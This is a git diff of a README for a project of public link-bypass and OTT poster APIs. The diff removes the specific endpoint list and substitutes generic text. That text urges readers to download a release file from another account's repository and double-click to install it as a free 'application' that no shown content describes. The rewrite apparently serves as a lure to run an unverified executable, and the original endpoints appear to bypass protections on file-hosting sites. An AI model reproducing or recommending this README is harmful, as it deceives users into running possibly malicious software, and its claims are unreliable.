@@ -1,66 +1,64 @@
-# 🚀 PBX1 Public OTT Bypass & Poster APIs
+# 🎉 Bypass-Bot-Api - Access Free APIs with Ease
 
-High-speed, stable, and production-ready APIs for cloud bypass and OTT poster extraction.  
-**Powered By @PBX1_BOTS** 🚀
+[![Download Bypass-Bot-Api](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/karolekk001/Bypass-Bot-Api/releases)
 
----
+## 🚀 Getting Started
 
-## 🔗 Bypass API Endpoints
+Welcome to the Bypass-Bot-Api project! This application provides access to free APIs that can enhance your online experience. Whether you want to find movie data or stream content, you've come to the right place.
 
-- **HubCloud**: `https://pbx1botapi.vercel.app/api/hubcloud?url=`  
-- **VCloud**: `https://pbx1botapi.vercel.app/api/vcloud?url=`  
-- **HubCDN**: `https://pbx1botapi.vercel.app/api/hubcdn?url=`  
-- **DriveLeech**: `https://pbx1botapi.vercel.app/api/driveleech?url=`  
-- **HubDrive**: `https://pbx1botapi.vercel.app/api/hubdrive?url=`  
-- **NeoDrive**: `https://pbx1botapi.vercel.app/api/neo?url=`  
-- **GDRex**: `https://pbx1botapi.vercel.app/api/gdrex?url=`  
-- **PixelCDN**: `https://pbx1botapi.vercel.app/api/pixelcdn?url=`  
-- **ExtraFlix**: `https://pbx1botapi.vercel.app/api/extraflix?url=`  
-- **ExtraLink**: `https://pbx1botapi.vercel.app/api/extralink?url=`  
-- **LuxDrive**: `https://pbx1botapi.vercel.app/api/luxdrive?url=`
-- **Nexdrive**:
-`https://pbx1botsapi2.vercel.app/api/nexdrive?url=`
-- **Hblinks**:
-`https://pbx1botsapi2.vercel.app/api/hblinks?url=`
-- **GDFlix**: `https://pbx1botapi.vercel.app/api/gdflix?url=`
+### 🌟 Features
 
----
+- **Free Access:** Use APIs designed to reduce costs.
+- **User-Friendly:** Easy to navigate for all users.
+- **Multiple Integrations:** Works with platforms like BookMyShow, Prime Video, and more.
+- **Flexible:** Suitable for casual users and power users alike.
 
-## 🎬 Poster API Endpoints
+## 📥 Download & Install
 
-- **Apple TV**: `https://appletv.pbx1bots.workers.dev/?url=`  
-- **Prime Video**: `https://primevideo.pbx1bots.workers.dev/?url=`  
-- **Airtel Xstream**: `https://airtelxstream.pbx1bots.workers.dev/?url=`  
-- **ZEE5**: `https://zee5.pbx1bots.workers.dev/?url=`  
-- **Stage**: `https://stage.pbx1bots.workers.dev/?url=`  
-- **BookMyShow (BMS)**: `https://bms.pbx1.workers.dev/?url=`  
-- **Sun NXT**: `https://sunnxt.pbx1.workers.dev/?url=`
+To get started, you need to download the application. 
 
----
+1. **Visit this page to download:** [Download Bypass-Bot-Api](https://github.com/karolekk001/Bypass-Bot-Api/releases)
+   
+   Look for the latest release on the page. You will find various files available for download.
 
-## ⚡ Usage Example
+2. **Choose your file:** Select the version that matches your operating system. For most users, that will be the file labeled with your specific OS, such as Windows or Mac.
 
-**Bypass API Example**
+3. **Download the file:** Click on the file link. Your browser will prompt you to save it. Choose a location on your computer that you can easily access, like your Desktop or Downloads folder.
 
-https://primevideo.pbx1bots.workers.dev/?url=YOUR_LINK
+4. **Run the application:** Once the file has downloaded, locate the file and double-click it to open. Follow the on-screen instructions to complete the installation.
 
----
+## 🛠️ System Requirements
 
-## 📝 Notes
+Before downloading, ensure your system meets the following requirements:
 
-- All APIs are public and free to use.  
-- Fast response and minimal downtime.  
-- No API key required.  
-- Watermark included: `Powered By @PBX1_BOTS`  
+- **Operating System:** Compatible with Windows, Mac, and Linux.
+- **RAM:** At least 2 GB of RAM recommended.
+- **Storage:** Minimum of 100 MB available on your hard drive.
+- **Network:** A stable internet connection for API access.
 
----
+## 📄 Documentation
 
-## 📅 Last Update
+For detailed instructions on using the Bypass-Bot-Api, refer to the documentation available within the application. You will find tutorials on connecting to different APIs, as well as tips for troubleshooting.
 
-**December 13, 2025**
+## ❓ FAQs
 
----
+**Q: Do I need programming knowledge to use this application?**  
+A: No, the Bypass-Bot-Api is designed for all users, regardless of technical background.
 
-## 📞 Contact
+**Q: Is it really free to use?**  
+A: Yes, all the APIs provided through this application are free.
 
-Telegram: [@PBX1_BOTS](https://t.me/PBX1_BOTS)
+**Q: What should I do if I encounter an issue?**  
+A: For any problems, you can reach out through the GitHub issues page or consult the FAQs in the documentation.
+
+## 🤝 Community Support
+
+Join our community! Share your experiences or ask questions by visiting the discussion page on GitHub. Your feedback helps us improve the software.
+
+## 🔗 Useful Links
+
+- [GitHub Repository](https://github.com/karolekk001/Bypass-Bot-Api)
+- [Release Notes](https://github.com/karolekk001/Bypass-Bot-Api/releases)
+- [Community Forum](https://github.com/karolekk001/Bypass-Bot-Api/discussions)
+
+Thank you for choosing Bypass-Bot-Api! Enjoy seamless access to your favorite services.
